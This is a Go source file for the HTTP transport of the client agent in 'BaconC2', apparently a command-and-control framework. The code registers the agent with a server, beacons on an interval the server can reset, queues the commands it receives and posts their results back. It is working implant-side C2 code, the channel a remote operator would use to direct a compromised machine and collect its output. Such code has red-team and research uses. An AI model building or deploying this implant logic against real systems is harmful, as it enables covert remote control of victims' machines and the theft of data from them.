package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/pkg/models"

	local_models "github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
)

var ProtocolName = "http"

const (
	registerAPIPath = "%s/api/agents/register"
	beaconAPIPath   = "%s/api/agents/beacon?id=%s"
	resultsAPIPath  = "%s/api/agents/results?id=%s"
)

type HTTPTransport struct {
	serverURL      string
	agentID        string
	httpClient     *http.Client
	commandQueue   queue.ICommandQueue
	resultQueue    queue.IResultQueue
	beaconInterval time.Duration
	stopChan       chan struct{}
}

func NewHTTPTransport(serverURL, agentID string, commandQueue queue.ICommandQueue, resultQueue queue.IResultQueue) local_models.ITransportProtocol {
	return &HTTPTransport{
		serverURL:      serverURL,
		agentID:        agentID,
		httpClient:     &http.Client{Timeout: 10 * time.Second},
		commandQueue:   commandQueue,
		resultQueue:    resultQueue,
		beaconInterval: 10 * time.Second,
		stopChan:       make(chan struct{}),
	}
}

func (t *HTTPTransport) Initialize(agent models.Agent) error {
	jsonData, err := json.Marshal(agent)
	if err != nil {
		return fmt.Errorf("failed to marshal agent: %w", err)
	}

	resp, err := t.httpClient.Post(fmt.Sprintf(registerAPIPath, t.serverURL), "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("HTTP registration error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("registration failed with status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

func (t *HTTPTransport) RunProtocol() error {
	t.beaconLoop()
	return nil
}

func (t *HTTPTransport) sendBeacon() error {

	url := fmt.Sprintf(beaconAPIPath, t.serverURL, t.agentID)
	resp, err := t.httpClient.Post(url, "application/json", nil)
	if err != nil {
		return fmt.Errorf("HTTP beacon error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("beacon failed with status %d: %s", resp.StatusCode, string(body))
	}
	var response models.HttpBeaconResponse
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return fmt.Errorf("failed to decode beacon response: %w", err)
	}

	// Update beacon interval if provided
	if response.NextBeacon > 0 {
		t.beaconInterval = time.Duration(response.NextBeacon) * time.Second
	}

	if err := t.commandQueue.Add(response.Command); err != nil {
		return fmt.Errorf("failed to queue command: %w", err)
	}

	return nil
}

func (t *HTTPTransport) SendResults() error {
	results, err := t.resultQueue.List()
	if err != nil {
		return fmt.Errorf("failed to get results from queue: %w", err)
	}

	if len(results) == 0 {
		return nil
	}

	jsonData, err := json.Marshal(results)
	if err != nil {
		return fmt.Errorf("failed to marshal results: %w", err)
	}

	url := fmt.Sprintf(resultsAPIPath, t.serverURL, t.agentID)
	resp, err := t.httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("HTTP batch result send error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("batch result send failed with status %d: %s", resp.StatusCode, string(body))
	}

	for i := 0; i < len(results); i++ {
		_, err := t.resultQueue.RemoveFirst()
		if err != nil {
			return fmt.Errorf("failed to clear result queue: %w", err)
		}
	}

	return nil
}

func (t *HTTPTransport) beaconLoop() {
	ticker := time.NewTicker(t.beaconInterval)
	defer ticker.Stop()

	for {
		select {
		case <-t.stopChan:
			return
		case <-ticker.C:
			if err := t.sendBeacon(); err != nil {
				log.Printf("Beacon send failed: %v", err)
			}
		}
	}
}

func (t *HTTPTransport) Close() error {
	t.httpClient.CloseIdleConnections()
	close(t.stopChan)
	return nil
}

func (t *HTTPTransport) GetBeaconInterval() time.Duration {
	return t.beaconInterval
}
